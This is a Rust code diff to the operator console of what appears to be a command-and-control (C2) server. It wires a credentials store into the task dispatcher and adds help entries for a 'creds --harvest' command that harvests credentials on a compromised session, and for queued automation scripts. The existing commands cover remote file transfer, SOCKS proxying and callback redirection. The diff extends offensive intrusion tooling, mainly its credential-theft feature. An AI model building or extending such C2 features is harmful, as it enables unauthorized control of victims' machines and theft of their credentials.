@@ -89,8 +89,6 @@ fn run_console(
     operator: Option<&str>,
     password: Option<&str>,
 ) -> anyhow::Result<()> {
-    let bind = config.bind.clone();
-
     let rt = tokio::runtime::Runtime::new()?;
 
     // Sessions, tasks, operators, and audit share one SQLite pool.
@@ -125,13 +123,14 @@ fn run_console(
 
     // C2 listener runs in the background.
     let listener_state = state.clone();
-    rt.spawn(async move { server::serve(listener_state, &bind).await });
+    rt.spawn(async move { server::serve(listener_state, &config).await });
 
     let audit = Arc::new(nw_server::audit_log::AuditLog::new(operator_pool.clone()));
     let dispatcher = Dispatcher::new(
         state.registry.clone(),
         state.queue.clone(),
         state.uploads.clone(),
+        state.creds.clone(),
         current_operator.clone(),
     )
     .with_audit(audit);
@@ -283,11 +282,13 @@ fn print_help() {
          \x20 download <path>           stream a remote file to the downloads dir\n\
          \x20 upload <local> <dest>     push a local file to the focused session\n\
          \x20 hashes <path>              compute SHA-256 of a file on the focused session\n\
+         \x20 creds [--all | --harvest]  list or harvest credentials on the focused session\n\
          \x20 socks <port>              start a SOCKS5 proxy on the focused session\n\
          \x20 jobs                     list task statuses for the focused session\n\
          \x20 killjob <task-uuid>       cancel a queued or in-flight task\n\
          \x20 redirect <host>            change the focused session callback host\n\
          \x20 kill <session-id>         drop a session\n\
+         \x20 script <file>           queue an automation script (task sequence) for the focused session\n\
          \x20 exit                      quit"
     );
 }
